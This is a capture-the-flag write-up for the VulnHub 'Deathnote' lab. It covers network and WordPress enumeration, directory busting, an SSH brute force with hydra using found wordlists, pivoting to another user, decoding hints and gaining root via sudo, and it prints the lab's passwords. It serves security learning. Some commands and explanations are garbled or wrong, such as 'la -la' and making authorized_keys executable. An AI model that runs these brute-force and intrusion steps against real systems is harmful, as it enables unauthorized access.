![[Pasted image 20240712204728.png]] 
link to download the Virtual Box: https://download.vulnhub.com/deathnote/Deathnote.ova
Lets get started,

To Scan the netwotk:
```
sudo netdiscover -i eth0
```
 Currently scanning: 192.168.6.0/16   |   Screen View: Unique Hosts                                                     4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 192.168.0.2     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 192.168.0.3     08:00:27:fa:39:02      1      60  PCS Systemtechnik GmbH                                                                                                                                                                  
 ==192.168.0.5     08:00:27:a6:d2:ef      1      60  PCS Systemtechnik GmbH==  

To scan the VULN-machine
```
sudo nmap -sS -sC -sV -p- 192.168.0.5
```
 Result
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 09:24 EDT
Nmap scan report for 192.168.0.5
Host is up (0.000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:A6:D2:EF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds

Now we have 2 ports open.we can look for connection establishment in those ports.
The port no.80 is web application port,we can look the site by searching th ip address on browser.sometimes it throws some error because of host DNS.we can  change it by the following command.
```
sudo nano /etc/hosts
```
Add the ipaddress in that file and save it.
![[Pasted image 20240709190648.png]]
Now again search for it in the browser.
As we check the url the website is running on wordpress.
wordpress:WordPress is a web content management system. It was originally created as a tool to publish blogs but has evolved to support publishing other web content, including more traditional websites, mailing lists and Internet forum, media galleries, membership sites, learning management systems, and online stores==. And it also has vulnerablities.==
 To identify those vulnerablities we use ==Wpscan.==
 Wpscan:
 The WPScan security scanner is primarily intended to be used by WordPress administrators and security teams **to assess the security status of their WordPress installations**. It is used to scan WordPress websites for known vulnerabilities both in WordPress and commonly used WordPress plugins and themes.
 Now copy the url .Perform the cmd
 ```
 wpscan --url http://deathnote.vuln/wordpress/

```
Result:
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://deathnote.vuln/wordpress/ [192.168.0.5]
[+] Started: Tue Jul  9 10:04:10 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://deathnote.vuln/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://deathnote.vuln/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://deathnote.vuln/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://deathnote.vuln/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.8</generator>
 |  - http://deathnote.vuln/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://deathnote.vuln/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jul  9 10:04:13 2024
[+] Requests Done: 186
[+] Cached Requests: 5
[+] Data Sent: 48.786 KB
[+] Data Received: 21.79 MB
[+] Memory used: 280.602 MB
[+] Elapsed time: 00:00:03
 As a Final result the website is not have vulnerable to wordpress.But we got some other usefull information,such as:
  Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 Now we can enumerate the url by using directory busting
 ```
 gobuster dir -u http://deathnote.vuln/wordpress/ -w /usr/share/wordlists/dirb/common.txt
```
Result:
![[Pasted image 20240709194721.png]]

As we see we got admin page but have no login credtionals.
Now again perform the  gobuster on deathnote vulnhub
```
gobuster dir -u http://deathnote.vuln  -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20240709195331.png]] 
Now we got a text file ==robots.txt==
search it on browser
```
http://192.168.0.5/robots.txt
```
![[Screenshot 2024-07-09 195124.png]] 
Now we got a image file. Download the file using the following command.
```
wget 192.168.0.5/important.jpg
```
But we can't open the file because the download file is actually a text file. so, we have to change the format into txt.
Now we got a hint.

![[Screenshot 2024-07-09 200032.png]] 

As we already saw a file user.txt in upload directory.so go and open the directory
we got some usernames.
As we see in the upload page we got another file in txt format called ==notes.txt==.so that may be the password file.
Now lets perform bruteforce attack by using the two files
First download the two files using wget command.
```
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
```
For bruteforcing we will use Hydra
```
hydra -L user.txt -P notes.txt ssh://192.168.0.5 
```
And we found the login credentials.

![[Screenshot 2024-07-09 201613.png]] 
 To login
 ```
 ssh l@192.168.0.5 
```
Password: death4me
http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/

use command
```
ls 
```
 we found a text file, see the content of the file using cat command.
 ```
 cat user.txt
```
we found some encrypted code, i.e. ==Brainfuck encryption code== we can decode the code by using some online brainfuck decoders. link. https://www.dcode.fr/brainfuck-language
And we got a message.
 ==Output: i think u got the shell , but you wont be able to kill me -kira==
 
 Change into home directory and search it using the command.
 ```
 la -la
```
 we found 2 directorities such as kira , L.
 change into kira directory and search using the same command.
 ```
 la -la
```
we got a text file, but we can't open the file because the user 'l' does not have the permission. so, we have to do the privilage escalation. And i got a another interesting directory i.e. ==ssh== change into that and i found a text file which has the as authorized_keys log.I copied the key and paste into the L directory using 'Vi' editor to get the access.
As of now the file has only read permission ,so we have to change that. by
```
chmod +x  authorized_keys
```
now login as kira user by:
```
ssh kira@192.168.0.5
```
Successfully login.After that search it using 
```
la-la
```
we got a text file,cat that file by using cat command.
```
cat kira.txt
```
And we got some binary text using base64 algorithm
```
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
```
Note:
Base64 is an algorithm to convert a stream of bytes into a stream of printable characters (and back). The origin of such binary-to-text encoding scheme like Base64 is the requirement to send a stream of bytes over a communication channel which does not allow binary data but only text-based data.

Now convert the binary text into normal by using the command.
```
echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64 -d

```

![[Pasted image 20240712201444.png]] 
Change into  /opt using cd command.
```
cd /opt
ls -la
```
And we got 2 directories:
1.fake-notebook-rule
2.kira-case
If we search into 2nd directory 
![[Pasted image 20240712204419.png]] 
we will see this lead so, change into 1st directory.
And search it.
Now we got to files, check the format using the command.
```
file hint
file case.wav
```
The case.wav file is in the format of ASCII text format. Cat that out.
```
cat case.wav
```

we got a hexadecimal digit which can be decoded by using the ==cyberchef== which we got from the hint file.
![[Pasted image 20240712202128.png]] 

Go to the site: https://gchq.github.io/CyberChef/
set the convertor from Hex
And paste the code.
```
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d

```


![[Screenshot 2024-07-12 202513.png]] 
Now we got a base64 format code. convert it
```
cGFzc3dkIDoga2lyYWlzZXZpbCA=
```

![[Pasted image 20240712202849.png]] 
We got a password for kira user.
```
passwd : kiraisevil 
```

To check the creditonals:
```
sudo -l
```
Type the password:
```
kiraisevil
```
And we got it the user kira has all the permission.
To obtain the root flag. Type the following commands: 
```
sudo su
```
```
cd /root
```
```
ls
```
```
cat root.txt
```

![[Pasted image 20240712203816.png]] 

==Congratulations You got the flag.==

